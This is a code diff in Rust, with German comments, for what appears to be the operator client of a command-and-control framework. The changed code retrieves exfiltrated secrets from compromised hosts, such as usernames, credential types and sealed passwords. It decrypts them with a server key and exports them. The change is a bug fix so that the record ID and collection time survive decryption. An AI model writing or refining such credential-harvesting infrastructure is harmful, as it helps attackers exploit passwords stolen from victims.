@@ -150,24 +150,11 @@ async fn main() {
         } => match c.secrets().await {
             Ok(secrets) => {
                 let zu_exportieren: Vec<kx_core::c2::ExfiltratedSecret> = if *decrypt {
-                    entschluesseln(&c, server_key.as_deref(), &secrets)
-                        .await
-                        .into_iter()
-                        .map(|k| {
-                            let wert = k.password.clone();
-                            kx_core::c2::ExfiltratedSecret {
-                                id: String::new(),
-                                host_id: k.host_id,
-                                cred_type: k.cred_type,
-                                username: k.username,
-                                password: String::new(),
-                                source: k.source,
-                                collected_at: String::new(),
-                                sealed_password: String::new(),
-                            }
-                            .mit_passwort(&wert)
-                        })
-                        .collect()
+                    // Derselbe Typ wie die Eingabe — der Export ist ein
+                    // Feld-Transfer, kein Typwechsel. Vorher wurde hier
+                    // zurückgebaut, und dabei gingen `id` und `collected_at`
+                    // verloren.
+                    entschluesseln(&c, server_key.as_deref(), &secrets).await
                 } else {
                     secrets.clone()
                 };
@@ -224,7 +211,7 @@ async fn entschluesseln(
     client: &client::Client,
     server_key: Option<&std::path::Path>,
     secrets: &[kx_core::c2::ExfiltratedSecret],
-) -> Vec<decrypt::Klartext> {
+) -> Vec<kx_core::c2::ExfiltratedSecret> {
     let pfad = match server_key {
         Some(p) => p,
         None => {
